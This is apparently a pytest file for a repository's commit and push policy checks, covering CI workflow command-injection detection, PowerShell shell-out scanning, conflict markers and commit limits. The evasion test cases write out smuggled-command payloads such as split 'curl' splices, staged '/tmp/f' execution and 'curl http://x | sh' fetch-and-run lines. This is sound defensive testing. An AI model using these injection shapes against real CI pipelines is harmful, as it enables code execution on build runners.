    pytest.param(
        "case x in\n  x) : ;;& y) c${{ inputs.x }}url http://y ;;\nesac",
        id="case-resume",
    ),
    pytest.param("echo hi > >(c${{ inputs.x }}url http://y)", id="process-substitution-out"),
    pytest.param('source /dev/stdin <<< "c${{ inputs.x }}url http://y"', id="source-sink"),
    pytest.param('. /dev/stdin <<< "c${{ inputs.x }}url http://y"', id="dot-source-sink"),
    pytest.param("echo 'c${{ inputs.x }}url' | python3 -c 'pass'", id="python-inline-sink"),
    pytest.param("echo 'c${{ inputs.x }}url' | perl -e 'system(<>)'", id="perl-inline-sink"),
    pytest.param("echo 'c${{ inputs.x }}url' | node -e 'x'", id="node-inline-sink"),
    pytest.param("echo 'c${{ inputs.x }}url' | awk '{system($0)}'", id="awk-sink"),
    pytest.param('ssh host "c${{ inputs.x }}url http://y"', id="ssh-sink"),
    pytest.param("find . -exec c${{ inputs.x }}url http://y \\;", id="find-exec-sink"),
    pytest.param('script -qc "c${{ inputs.x }}url http://y" /dev/null', id="script-sink"),
    pytest.param("echo 'c${{ inputs.x }}url' | ruby -e 'x'", id="ruby-inline-sink"),
    pytest.param(
        "echo 'c${{ inputs.x }}url http://y' | while read l; do eval \"$l\"; done",
        id="piped-into-compound-eval",
    ),
    pytest.param("CMD=c${{ inputs.x }}url; $CMD http://y", id="assignment-then-expansion"),
    pytest.param("bash <(echo c${{ inputs.x }}url http://y)", id="process-substitution-in"),
)


@pytest.mark.parametrize("run", _TOKENIZER_EVASIONS)
def test_tokenizer_evasions_are_refused_tolerance(run: str) -> None:
    """Round-three shapes that reached command position are all refused.

    Each defeated the first tokenizer: a missing sink, a compound command that
    broke the pipeline, a here-string or process substitution swallowed as a
    redirect target, or an expression followed through an assignment.
    """
    assert policy._splices_expression_into_command_word(run) is True


def test_unbalanced_quote_splice_is_blocked_by_the_syntax_check() -> None:
    """The one shape the tokenizer misses is caught downstream.

    An unterminated quote swallows the spliced word into an argument, so the
    tokenizer allows it. The body is not valid shell, so the syntax check
    refuses the tolerance before the allowance can matter. Recorded here so a
    later change to either half cannot silently open the hole.
    """
    run = 'echo "unterminated\nc${{ inputs.x }}url http://y'
    assert policy._splices_expression_into_command_word(run) is False
    assert policy._body_is_valid_shell_syntax(run) is False
    assert policy._step_defeats_bash_subparse("bash", run) is False


def test_script_interpreters_are_sinks_only_with_an_inline_code_flag() -> None:
    """Running a script file does not promote its arguments to command position.

    Adding ``python3`` to the sink set without this test refused
    ``python3 build.py --tag "v${{ inputs.version }}"``, a shape that appears in
    real workflows.
    """
    assert (
        policy._splices_expression_into_command_word(
            'python3 build.py --tag "v${{ inputs.version }}"'
        )
        is False
    )
    assert (
        policy._splices_expression_into_command_word(
            "echo 'c${{ inputs.x }}url' | python3 -c 'pass'"
        )
        is True
    )


def test_tainted_variable_must_be_the_whole_command_word() -> None:
    """A tainted name inside a larger command word is an argument, not a command.

    Following assignments without this rule refused agent-metrics.yml, where
    ``COVERAGE="${{ ... }}"`` is later read inside ``$(echo "$COVERAGE >= 50" |
    bc -l)``.
    """
    assert (
        policy._splices_expression_into_command_word(
            'COVERAGE="${{ steps.check.outputs.coverage }}"\n'
            'if (( $(echo "$COVERAGE >= 50" | bc -l) )); then echo ok; fi'
        )
        is False
    )


_STAGED_SINK_EVASIONS = (
    # A variable holding the shell name reaches the sink lookup only if
    # assignments are followed for sink names, not just for tainted values.
    'SH=bash; $SH -c "c${{ github.event.pull_request.title }}url http://x"',
    # A brace group is a compound command, so the pipe that follows it has to
    # fold the group back into its own pipeline.
    "echo 'c${{ github.event.pull_request.title }}url http://x' | { eval \"$l\"; }",
    "{ echo 'c${{ github.event.pull_request.title }}url http://x'; } | sh",
    # A subshell feeding a pipe is the same shape with different brackets.
    "(echo 'c${{ github.event.pull_request.title }}url http://x') | sh",
    # An interpreter flag glued to its script still runs the script.
    "echo 'c${{ github.event.pull_request.title }}url' | perl -e'system(<>)'",
    # A line continuation inside the command name hides it from a plain lookup.
    'ba\\\nsh -c "c${{ github.event.pull_request.title }}url http://x"',
    # Staging the payload in a file moves it between pipelines without a pipe.
    "echo 'c${{ github.event.pull_request.title }}url http://x' > /tmp/f & sh /tmp/f",
)


@pytest.mark.parametrize("run", _STAGED_SINK_EVASIONS)
def test_staged_sink_evasions_are_refused_tolerance(run: str) -> None:
    """Round-four shapes that reached a sink indirectly are all refused.

    Each defeated the pipeline-scoped tokenizer by putting distance between the
    spliced word and the sink: a variable holding the shell name, a group piped
    onwards, a glued interpreter flag, a line continuation inside the command
    name, or a file staged in one pipeline and executed in another.
    """
    assert policy._splices_expression_into_command_word(run) is True


_STAGED_SINK_NEGATIVE_CONTROL = (
    # A brace expansion is not a compound command.
    'mkdir -p "out/${{ inputs.name }}"/{a,b}',
    # A group whose output is not piped keeps its own pipeline, so a sink
    # inside it must not promote an expression outside it.
    'if [ "${{ inputs.flag }}" = "true" ]; then curl -sSL http://x | sh; fi',
    # A flag that merely looks like a code flag does not make an interpreter a
    # sink.
    'echo "${{ inputs.name }}" | python3 --version',
    # A file written but never executed carries no dataflow to a sink.
    'echo "${{ inputs.name }}" > /tmp/n; cat /tmp/n',
)


@pytest.mark.parametrize("run", _STAGED_SINK_NEGATIVE_CONTROL)
def test_staged_sink_rules_do_not_over_tighten(run: str) -> None:
    """The round-four rules leave neighbouring legitimate shapes alone.

    Each of the four fixes narrows the guard, and every previous narrowing in
    this file over-tightened at least once. These pin the boundary: brace
    expansion is not a group, an unpiped group does not share its sink, a
    non-code flag does not arm an interpreter, and an unexecuted file stages
    nothing.
    """
    assert policy._splices_expression_into_command_word(run) is False


def test_staged_file_promotion_needs_both_a_write_and_an_execution() -> None:
    """File-mediated promotion is a negative control against blanket promotion.

    Promoting on the write alone would refuse every workflow that writes an
    expression to a file, which is common. Only naming that file as a sink
    argument connects the two pipelines.
    """
    staged = "echo 'c${{ inputs.x }}url http://y' > /tmp/f & sh /tmp/f"
    unstaged = "echo 'c${{ inputs.x }}url http://y' > /tmp/f & sh /tmp/other"
    assert policy._splices_expression_into_command_word(staged) is True
    assert policy._splices_expression_into_command_word(unstaged) is False


_POWERSHELL_SHELL_OUTS = (
    'bash -c "curl http://x | sh"',
    "& bash -c $payload",
    ". /usr/bin/sh",
    'Start-Process bash -ArgumentList "-c","curl x|sh"',
    'Start-Process -FilePath sh -ArgumentList "-c","x"',
    '$p = "curl x | sh"\nbash -c $p',
    'Write-Host hi; sh -c "curl x | sh"',
    "echo hi | bash",
    '/bin/dash -c "x"',
    'zsh -c "curl x | sh"',
    'bash.exe -c "x"',
    '& "bash" -c $p',
    "if ($true) { bash -c $p }",
    "& 'bash' -c $p",
    "ba`sh -c $p",
)


@pytest.mark.parametrize("body", _POWERSHELL_SHELL_OUTS)
def test_powershell_shell_outs_are_detected(body: str) -> None:
    """Every way a PowerShell step reaches a POSIX shell is reported.

    Semgrep sub-parses a ``run:`` body as Bash only for a Bash step, so each of
    these produces zero findings and zero errors while the payload still runs
    under Bash on the runner. Refs #3684.
    """
    assert policy._posix_shell_invocations(body) != []


_POWERSHELL_DATA_MENTIONS = (
    'Write-Host "Use bash for this"',
    '$msg = "install with: curl x | sh"',
    'Get-ChildItem | Where-Object { $_.Name -eq "bash" }',
    "# bash is not available here",
    '<#\n bash -c "curl | sh"\n#>\nWrite-Host ok',
    '$shells = @("bash", "sh", "zsh")',
    'if ($env:SHELL -match "bash") { Write-Host yes }',
    'Write-Output "sh"',
    'Set-Content -Path out.txt -Value "bash -c hi"',
    '$x = "bash"',
    "# call and the bash echo, the output is empty",
    'Write-Host "run bash later"',
)


@pytest.mark.parametrize("body", _POWERSHELL_DATA_MENTIONS)
def test_powershell_data_mentions_are_not_invocations(body: str) -> None:
    """Naming a shell in a string, a comment, or a comparison is not running it."""
    assert policy._posix_shell_invocations(body) == []


def test_naive_shell_name_regex_negative_control() -> None:
    """Prove the quote-aware scan is what avoids the false positives.

    A plain word-boundary search for a shell name flags real workflow prose. One
    step in this repository says "the bash echo" in a comment, so the naive form
    would block a push over an English sentence.
    """
    naive = re.compile(r"\b(?:bash|sh|dash|zsh|ksh)\b")
    flagged = [body for body in _POWERSHELL_DATA_MENTIONS if naive.search(body)]
    assert len(flagged) > len(_POWERSHELL_DATA_MENTIONS) // 2
    assert all(policy._posix_shell_invocations(body) == [] for body in flagged)


class TestQuotingAnArgumentDoesNotHideTheShellItNames:
    """A quoted operand of an executing parameter is still the program that runs.

    ``_powershell_words`` marks quoted text as data, which is correct for
    command position: ``$x = "bash"`` names a shell without running one. It
    then dropped that text from the word list entirely, so the word never
    reached the check that reads the *preceding* token. ``-FilePath`` and
    ``Start-Process`` execute their operand whether or not the author put
    quotes around it, so dropping the quoted form let one keystroke defeat the
    scan. Refs #3684.
    """

    def test_a_quoted_filepath_operand_is_reported(self) -> None:
        body = 'Start-Process -FilePath "bash" -ArgumentList "-c","id"'
        assert policy._posix_shell_invocations(body) == ["bash"]

    def test_a_quoted_positional_operand_is_reported(self) -> None:
        body = 'Start-Process "sh"'
        assert policy._posix_shell_invocations(body) == ["sh"]

    def test_quoting_does_not_change_the_verdict(self) -> None:
        """The quoted and unquoted spellings of one command agree."""
        quoted = 'Start-Process -FilePath "bash"'
        bare = "Start-Process -FilePath bash"
        assert policy._posix_shell_invocations(quoted) == policy._posix_shell_invocations(bare)

    def test_a_quoted_word_outside_an_executing_parameter_stays_data(self) -> None:
        """Emitting quoted words must not turn every string into an invocation.

        This is the negative control for the widening: the same word, in the
        same quotes, with a preceding token that does not execute it.
        """
        assert policy._posix_shell_invocations('Write-Output "sh"') == []
        assert policy._posix_shell_invocations('$x = "bash"') == []
        assert policy._posix_shell_invocations('Set-Content -Value "bash -c hi"') == []

    def test_a_colon_joined_filepath_operand_is_reported(self) -> None:
        """``-FilePath:bash`` binds the same operand as ``-FilePath bash``."""
        body = "Start-Process -FilePath:bash -ArgumentList '-c','id'"
        assert policy._posix_shell_invocations(body) == ["bash"]

    def test_a_colon_joined_quoted_operand_is_reported(self) -> None:
        body = 'Start-Process -FilePath:"bash" -ArgumentList "-c","id"'
        assert policy._posix_shell_invocations(body) == ["bash"]

    def test_a_colon_with_a_detached_operand_is_reported(self) -> None:
        """``-FilePath: bash`` leaves the operand as the following word."""
        body = "Start-Process -FilePath: bash"
        assert policy._posix_shell_invocations(body) == ["bash"]

    def test_a_colon_joined_non_shell_operand_stays_data(self) -> None:
        """Negative control: the split must not widen past exec parameters."""
        assert policy._posix_shell_invocations("Start-Process -FilePath:notepad") == []
        assert policy._posix_shell_invocations('Write-Output "a:bash"') == []
        assert policy._posix_shell_invocations("Get-Item C:\\bash") == []


class TestACallTokenIsOnlyACallTokenUnderPowerShell:
    """``&`` and ``.`` invoke a command in PowerShell and nowhere else.

    ``_is_reviewed_shell_argument`` keys its flag allowlist per interpreter but
    checked the call-token pattern globally, so ``python3 &'{0}'`` classified
    as a reviewed non-Bash invocation. Under ``python3`` those characters are
    an ordinary argument, not a call operator, so the exemption was granted on
    a syntax the named interpreter does not have. Refs #3683.
    """

    @pytest.mark.parametrize("token", ["&'{0}'", ".'{0}'", '&"{0}"'])
    def test_a_call_token_is_not_reviewed_under_a_non_powershell_interpreter(
        self, token: str
    ) -> None:
        assert policy._is_reviewed_shell_argument(token, "python3") is False

    @pytest.mark.parametrize("token", ["&'{0}'", ".'{0}'", '&"{0}"'])
    @pytest.mark.parametrize("interpreter", ["pwsh", "powershell"])
    def test_a_call_token_stays_reviewed_under_powershell(
        self, interpreter: str, token: str
    ) -> None:
        """The narrowing must not withdraw the exemption PowerShell relies on."""
        assert policy._is_reviewed_shell_argument(token, interpreter) is True

    def test_the_placeholder_token_stays_reviewed_everywhere(self) -> None:
        """``{0}`` is the runner's script path under every interpreter."""
        assert policy._is_reviewed_shell_argument("{0}", "python3") is True
        assert policy._is_reviewed_shell_argument("{0}", "pwsh") is True

    @pytest.mark.parametrize(
        "shell",
        [
            "pwsh -NoProfile -Command \"& '{0}'\"",
            "pwsh",
            "python3 {0}",
        ],
    )
    def test_every_shell_string_used_in_this_repository_still_classifies(self, shell: str) -> None:
        """Pin the live workflow spellings so the narrowing cannot break them."""
        assert policy._is_non_bash_shell(shell) is True


def test_powershell_scan_reports_only_powershell_steps(tmp_path: Path) -> None:
    workflow = tmp_path / ".github" / "workflows" / "w.yml"
    workflow.parent.mkdir(parents=True)
    _write_lf(
        workflow,
        "on: push\n"
        "jobs:\n"
        "  j:\n"
        "    steps:\n"
        "      - shell: bash\n"
        '        run: bash -c "curl http://x | sh"\n'
        "      - shell: pwsh\n"
        '        run: Write-Host "bash is only mentioned"\n',
    )
    assert policy._scan_powershell_shell_outs(tmp_path, [".github/workflows/w.yml"]) == 0
    _write_lf(
        workflow,
        "on: push\n"
        "jobs:\n"
        "  j:\n"
        "    steps:\n"
        "      - shell: pwsh\n"
        '        run: bash -c "curl http://x | sh"\n',
    )
    assert policy._scan_powershell_shell_outs(tmp_path, [".github/workflows/w.yml"]) == 1


def test_powershell_scan_skips_unreadable_and_non_yaml_paths(tmp_path: Path) -> None:
    """A missing file or a non-YAML path is skipped rather than raising."""
    assert policy._scan_powershell_shell_outs(tmp_path, ["scripts/a.py"]) == 0
    assert policy._scan_powershell_shell_outs(tmp_path, ["absent.yml"]) == 0


@pytest.mark.parametrize(
    ("shell", "expected"),
    [
        ("pwsh", True),
        ("powershell", True),
        ("pwsh -NoProfile", True),
        ("C:/tools/pwsh.exe -NoLogo", True),
        ('"C:\\Program Files\\PowerShell\\pwsh.exe" -NoProfile', True),
        ("bash -c 'pwsh'", False),
        ("bash", False),
        ("", False),
        (None, False),
    ],
)
def test_powershell_shell_declaration_is_recognised(shell: str | None, expected: bool) -> None:
    """The shell key is matched by executable name, not by exact string."""
    assert policy._is_powershell_shell(shell) is expected


# Round-5 adversarial probe. Every shape below reached a shell through a route
# the round-4 rules did not follow: an alias chain, a brace-form expansion, a
# `|&` pipe, a file staged by an argument rather than a redirect, a staged file
# run directly, a sink the set did not name, or the argument list. Refs #3683.
_ROUND_FIVE_EVASIONS = (
    ("alias-two-hop", 'A=bash; B=$A; $B -c "c{expression}url http://x"'),
    ("alias-braced-use", 'SH=bash; ${{SH}} -c "c{expression}url http://x"'),
    ("alias-cmdsub-rhs", 'SH=$(echo bash); $SH -c "c{expression}url http://x"'),
    ("group-pipe-both", "(echo 'c{expression}url http://x') |& sh"),
    ("staged-tee", "echo 'c{expression}url http://x' | tee /tmp/f; sh /tmp/f"),
    ("staged-quoted-path", 'echo \'c{expression}url http://x\' > "/tmp/f"; sh "/tmp/f"'),
    ("staged-chmod-exec", "echo 'c{expression}url' > /tmp/f; chmod +x /tmp/f; /tmp/f"),
    ("sink-trap", 'trap "c{expression}url http://x" EXIT'),
    ("sink-parallel", 'echo 1 | parallel "c{expression}url http://x"'),
    ("sink-make", 'make -f /dev/stdin <<<"a:\n\tc{expression}url http://x"'),
    ("set-positional", 'set -- "c{expression}url http://x"; bash -c "$1"'),
)

# The controls for the round-5 narrowings. Each one is a legitimate shape that
# the corresponding new rule would refuse if it were written one step wider:
# treating `tee` as a sink rather than a writer, promoting any staged file
# instead of an executed one, sharing one code-flag set across interpreters so
# `make -f` also flags `python3 -f`, folding `|&` into the sink test the way a
# real pipe is folded, or reading `set` as a sink because it stages values.
_ROUND_FIVE_NEGATIVE_CONTROL = (
    ("tee-writes-it-does-not-run-it", 'echo "{expression}" | tee build.log'),
    ("staged-file-only-read", 'echo "{expression}" > /tmp/f; cat /tmp/f'),
    ("interpreter-file-flag", 'python3 build.py -f config.yml --tag "{expression}"'),
    ("pipe-both-to-a-non-sink", 'echo "{expression}" |& cat'),
    ("set-options-not-arguments", 'set -euo pipefail\necho "{expression}"'),
    ("unresolved-name-without-a-code-flag", 'TOOL=./gradlew; $TOOL build "{expression}"'),
)


@pytest.mark.parametrize(("name", "template"), _ROUND_FIVE_EVASIONS)
def test_round_five_evasions_are_refused(name: str, template: str) -> None:
    """Each round-5 shape reaches a shell, so command position has to catch it."""
    body = template.format(expression="${{ github.event.pull_request.title }}")
    assert policy._splices_expression_into_command_word(body), name


@pytest.mark.parametrize(("name", "template"), _ROUND_FIVE_NEGATIVE_CONTROL)
def test_round_five_narrowings_do_not_over_tighten(name: str, template: str) -> None:
    """The round-5 rules must not refuse the legitimate shape next door."""
    body = template.format(expression="${{ github.event.pull_request.title }}")
    assert not policy._splices_expression_into_command_word(body), name


def test_code_flags_are_per_interpreter_not_shared() -> None:
    """`make -f` reads code; `python3 -f` does not, and sharing one set conflates them.

    Without the split, adding the flag `make` needs would refuse every ordinary
    `python3 script.py -f config.yml` that also carries an expression.
    """
    assert "-f" in policy.SHELL_CODE_FLAG_SINKS["make"]
    assert "-f" not in policy.SHELL_CODE_FLAG_SINKS["python3"]
    assert "-exec" not in policy.SHELL_CODE_FLAG_SINKS["python3"]
    assert "-c" not in policy.SHELL_CODE_FLAG_SINKS["find"]


def test_sink_aliases_resolve_through_a_chain() -> None:
    """A name assigned another name still has to reach the shell it names."""
    scan = policy._shell_words("A=bash; B=$A; C=$B; $C -c x")
    assert policy._shell_sink_aliases(scan.words) == {"A": "bash", "B": "bash", "C": "bash"}


def test_sink_alias_resolution_terminates_on_a_cycle() -> None:
    """A self-referential assignment must not spin the resolver."""
    scan = policy._shell_words("A=$B; B=$A; $A -c x")
    assert policy._shell_sink_aliases(scan.words) == {}


@pytest.mark.parametrize(
    ("word", "expected"),
    [
        ("$SH", "SH"),
        ("${SH}", "SH"),
        ('"$SH"', "SH"),
        ('"${SH}"', "SH"),
        ("$1", None),
        ("bash", None),
        ("c${SH}url", None),
        ("$(echo bash)", None),
    ],
)
def test_variable_word_recognises_only_a_bare_expansion(word: str, expected: str | None) -> None:
    """A word that merely contains a variable is not a reference to one."""
    assert policy._shell_variable_name(word) == expected


# Issue #3671: nothing stopped a git conflict marker reaching a commit. The
# detector keys only on the labelled forms git writes and skips fenced code
# blocks so documentation can quote a conflict.
# ---------------------------------------------------------------------------

_CONFLICT_MARKER_CASES = (
    ("plain-conflict", "a\n<<<<<<< HEAD\nx\n=======\ny\n>>>>>>> main\nb\n", True),
    ("diff3-conflict", "<<<<<<< ours\nx\n||||||| base\nz\n=======\ny\n>>>>>>> theirs\n", True),
    ("half-resolved-open", "<<<<<<< HEAD\nx\ny\n", True),
    ("half-resolved-close", "x\ny\n>>>>>>> origin/main\n", True),
    ("ancestor-marker-alone", "||||||| merged common ancestors\n", True),
    ("conflict-after-a-closed-fence", "```\ncode\n```\n<<<<<<< HEAD\nx\n>>>>>>> main\n", True),
    ("crlf-conflict", "a\r\n<<<<<<< HEAD\r\nx\r\n>>>>>>> main\r\n", True),
    ("fenced-documentation", "text\n```\n<<<<<<< HEAD\nx\n=======\ny\n>>>>>>> main\n```\n", False),
    ("tilde-fenced-documentation", "text\n~~~\n<<<<<<< HEAD\n>>>>>>> main\n~~~\n", False),
    ("fence-with-info-string", "```diff\n<<<<<<< HEAD\n>>>>>>> main\n```\n", False),
    ("indented-fence", "text\n  ```\n<<<<<<< HEAD\n  ```\n", False),
    ("rst-section-underline", "Title\n=======\nbody\n", False),
    ("markdown-setext-heading", "Heading\n=======\n\ntext\n", False),
    ("bare-equals-rule", "text\n=======\ntext\n", False),
    ("unlabelled-markers", "<<<<<<<\n=======\n>>>>>>>\n", False),
    ("six-angle-brackets", "<<<<<< HEAD\n", False),
    ("eight-angle-brackets", "<<<<<<<< HEAD\n", False),
    ("indented-marker", "    <<<<<<< HEAD\n", False),
    ("marker-mid-line", "x <<<<<<< HEAD\n", False),
    ("commented-equals-rule", "# =======\ncode\n", False),
    ("markdown-table", "| a | b |\n|---|---|\n", False),
    ("empty-file", "", False),
)


@pytest.mark.parametrize(
    ("body", "flagged"),
    [pytest.param(body, flagged, id=name) for name, body, flagged in _CONFLICT_MARKER_CASES],
)
def test_conflict_marker_detection(body: str, flagged: bool) -> None:
    violations = policy._conflict_marker_violations("f.md", body.encode("utf-8"))
    assert bool(violations) is flagged


def test_conflict_marker_violation_names_the_line_number() -> None:
    violations = policy._conflict_marker_violations("doc.md", b"one\ntwo\n<<<<<<< HEAD\n")
    assert violations == ["doc.md:3: <<<<<<< HEAD"]


def test_conflict_marker_policy_reads_the_index_blob(tmp_path: Path) -> None:
    """The gate must judge what is staged, not what is in the working tree."""
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "doc.md", "clean\n")
    _write_file(repo, "doc.md", "<<<<<<< HEAD\nx\n>>>>>>> main\n")
    _git(repo, "add", "doc.md")
    _write_file(repo, "doc.md", "working tree clean\n")

    assert policy.check_staged_conflict_markers(["doc.md"], repo) == 1
    assert policy.check_staged_conflict_markers([], repo) == 0
    assert policy.check_staged_conflict_markers(["../doc.md"], repo) == 2


def test_conflict_marker_policy_passes_a_clean_staged_file(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "doc.md", "clean\n")
    _write_file(repo, "doc.md", "Title\n=======\nstill clean\n")
    _git(repo, "add", "doc.md")

    assert policy.check_staged_conflict_markers(["doc.md"], repo) == 0


def test_conflict_marker_policy_reports_an_unmerged_path(
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """A conflicted, unstaged path produces a message rather than exit 0.

    Stage 0 is absent mid-conflict, so the index read fails and the old code
    skipped the path silently (issue #3770, AC3).
    """
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "doc.md", "base\n")
    _git(repo, "checkout", "-q", "-b", "other")
    _commit_file(repo, "doc.md", "other\n")
    _git(repo, "checkout", "-q", "feature/test")
    _commit_file(repo, "doc.md", "feature\n")
    _git(repo, "merge", "other", check=False)

    assert policy.check_staged_conflict_markers(["doc.md"], repo) == 1
    error = capsys.readouterr().err
    assert "unresolved merge conflicts" in error
    assert "doc.md" in error


def test_conflict_marker_policy_still_skips_a_path_not_in_the_index(
    tmp_path: Path,
) -> None:
    """Negative control: absent-from-index stays a silent skip, not an error."""
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "doc.md", "base\n")

    assert policy.check_staged_conflict_markers(["missing.md"], repo) == 0


def test_conflict_marker_policy_skips_the_hook_fixture_prefix(tmp_path: Path) -> None:
    """tests/hooks/fixtures carries prohibited bytes on purpose."""
    repo = tmp_path / "repo"
    _init_repo(repo)
    fixture = "tests/hooks/fixtures/conflict.md"
    (repo / "tests" / "hooks" / "fixtures").mkdir(parents=True)
    (repo / fixture).write_text("<<<<<<< HEAD\nx\n>>>>>>> main\n", encoding="utf-8")
    _git(repo, "add", fixture)

    assert policy.check_staged_conflict_markers([fixture], repo) == 0


def test_the_repository_itself_has_no_unfenced_conflict_markers() -> None:
    """Real-corpus control: the rule must not fire on any tracked file today."""
    tracked = subprocess.run(
        ["git", "ls-files", "-z"],
        cwd=PROJECT_ROOT,
        capture_output=True,
        check=True,
    ).stdout.split(b"\0")
    offenders: list[str] = []
    for raw in tracked:
        if not raw:
            continue
        candidate = PROJECT_ROOT / raw.decode()
        try:
            data = candidate.read_bytes()
        except OSError:
            continue
        if b"\0" in data[:4096]:
            continue
        offenders.extend(policy._conflict_marker_violations(raw.decode(), data))
    assert offenders == []


# ---------------------------------------------------------------------------
# Issue #3610: the ceiling's only relief was a `commit-limit-bypass` label on an
# open PR, which cannot exist on a branch's first push. A stacked branch that
# inherits its ancestors' commits therefore deadlocked.
# ---------------------------------------------------------------------------


def _deny_bypass_label(monkeypatch: pytest.MonkeyPatch) -> None:
    """Fail only the bypass-label lookup, leaving real git calls intact.

    `_run_git` is implemented on top of `_run_command`, so a blanket patch of
    `_run_command` also breaks the rev-list the ceiling depends on and turns
    every result into a config error.
    """
    real = policy._run_command

    def fake(
        argv: Sequence[str],
        repo_root: Path,
        **kwargs: Any,
    ) -> subprocess.CompletedProcess[str]:
        if any("check_pr_bypass_label" in str(part) for part in argv):
            return _completed(1)
        return real(argv, repo_root, **kwargs)

    monkeypatch.setattr(policy, "_run_command", fake)


def _stacked_repo(tmp_path: Path, first: int, second: int) -> tuple[Path, str]:
    """Build origin/main plus a pushed featA and an unpushed featB stacked on it."""
    remote = tmp_path / "remote.git"
    work = tmp_path / "work"
    subprocess.run(["git", "init", "-q", "--bare", str(remote)], check=True)
    _init_repo(work, branch="main")
    _commit_file(work, "README.md", "seed\n")
    _git(work, "remote", "add", "origin", str(remote))
    _git(work, "push", "-q", "origin", "main")

    _git(work, "checkout", "-q", "-b", "featA")
    for index in range(first):
        _commit_file(work, f"a{index}.txt", f"{index}\n")
    _git(work, "push", "-q", "origin", "featA")

    _git(work, "checkout", "-q", "-b", "featB")
    for index in range(second):
        _commit_file(work, f"b{index}.txt", f"{index}\n")
    head = _git(work, "rev-parse", "HEAD").stdout.strip()
    return work, head


def _update_for(branch: str, head: str) -> policy.PushUpdate:
    source = policy.PushRef(f"refs/heads/{branch}", head, f"refs/heads/{branch}", "0" * 40)
    return policy.PushUpdate(source, "origin/main", head, f"origin/main..{head}", branch)


def test_a_stacked_branch_counts_only_the_commits_it_adds(tmp_path: Path) -> None:
    work, head = _stacked_repo(tmp_path, first=15, second=10)
    assert int(_git(work, "rev-list", "--count", "origin/main..HEAD").stdout) == 25
    assert policy._unpushed_commit_count(_update_for("featB", head), work) == 10


def test_a_re_push_of_the_same_branch_gets_no_relief(tmp_path: Path) -> None:
    """Negative control: excluding the branch's own remote ref would retire the
    ceiling for every branch pushed more than once."""
    work, _ = _stacked_repo(tmp_path, first=15, second=0)
    _git(work, "checkout", "-q", "featA")
    for index in range(6):
        _commit_file(work, f"a2_{index}.txt", f"{index}\n")
    head = _git(work, "rev-parse", "HEAD").stdout.strip()
    assert int(_git(work, "rev-list", "--count", "origin/main..HEAD").stdout) == 21
    assert policy._unpushed_commit_count(_update_for("featA", head), work) == 21


def test_the_commit_limit_lets_a_stacked_first_push_through(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """End to end: no PR exists, the bypass label check fails, relief still applies."""
    work, head = _stacked_repo(tmp_path, first=15, second=10)
    _deny_bypass_label(monkeypatch)
    assert policy._check_commit_limit(_update_for("featB", head), work) == 0


def test_the_commit_limit_still_blocks_an_unstacked_branch(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Negative control: 25 commits none of which another branch carries is blocked."""
    work, _ = _stacked_repo(tmp_path, first=0, second=0)
    _git(work, "checkout", "-q", "-b", "solo")
    for index in range(25):
        _commit_file(work, f"s{index}.txt", f"{index}\n")
    head = _git(work, "rev-parse", "HEAD").stdout.strip()
    _deny_bypass_label(monkeypatch)
    assert policy._check_commit_limit(_update_for("solo", head), work) == 1


def test_the_commit_ceilings_come_from_the_shared_module() -> None:
    """Issue #3596: the hook must not restate the numbers CI enforces."""
    from scripts.validation import pr_commit_count

    assert policy.BLOCK_THRESHOLD == pr_commit_count.BLOCK_THRESHOLD == 20
    assert policy.MAIN_MERGE_BLOCK_THRESHOLD == pr_commit_count.MAIN_MERGE_BLOCK_THRESHOLD == 40


def test_taste_findings_stay_advisory(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """Exit 10 is the linter reporting violations. Local scope is the staged
    set, so blocking here would fail a contributor for debt they inherited by
    touching one line of a large file. Enforcement is the whole-tree ratchet in
    CI (scripts/ci/taste_count_ratchet.py) instead.
    """
    monkeypatch.setattr(
        policy,
        "_run_command",
        lambda *_args, **_kwargs: _completed(10, "findings\n", ""),
    )
    assert policy.run_taste_advisory(["source.py"], tmp_path) == 0
    assert "advisory" in capsys.readouterr().err


def test_a_crashed_taste_lint_is_not_reported_as_advisory_findings(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """The isolating control for the wrapper half of issue #3779.

    taste_lints.py exits 1 on a script error and 10 on violations. Treating
    both as findings meant a linter that could not run printed the same
    reassuring line as a clean one, so nothing was checked and nothing said so.
    """
    monkeypatch.setattr(
        policy,
        "_run_command",
        lambda *_args, **_kwargs: _completed(1, "", "Traceback\n"),
    )
    assert policy.run_taste_advisory(["source.py"], tmp_path) == 2
    err = capsys.readouterr().err
    assert "not a scan result" in err
    assert "advisory" not in err


def test_a_clean_taste_lint_says_nothing(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    monkeypatch.setattr(
        policy,
        "_run_command",
        lambda *_args, **_kwargs: _completed(0, "", ""),
    )
    assert policy.run_taste_advisory(["source.py"], tmp_path) == 0
    assert "advisory" not in capsys.readouterr().err


# ---------------------------------------------------------------------------
# Issue #3770: the conflict-marker gate needs a backstop that survives every
# route which skips local hooks
# ---------------------------------------------------------------------------


def test_the_tracked_scan_passes_a_clean_tree(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "doc.md", "clean\n")

    assert policy.check_tracked_conflict_markers(repo) == 0


def test_the_tracked_scan_catches_a_marker_the_staged_scan_cannot(
    tmp_path: Path,
) -> None:
    """The isolating control for this whole change.

    The pre-commit gate is invoked with `{staged_files}`. Once a commit is made
    nothing is staged, so every later hook run passes it an empty list and it
    returns 0 without reading anything. The marker is now in the history and no
    local hook will ever be handed its path again.

    That is the gap b71580c23 fell through, and it is why a backstop has to
    choose its own scope rather than inherit one from the staging area.
    """
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "doc.md", "<<<<<<< HEAD\nx\n>>>>>>> main\n")

    # What lefthook actually invokes after the commit: nothing is staged.
    assert _git(repo, "diff", "--name-only", "--cached").stdout.strip() == ""
    assert policy.check_staged_conflict_markers([], repo) == 0

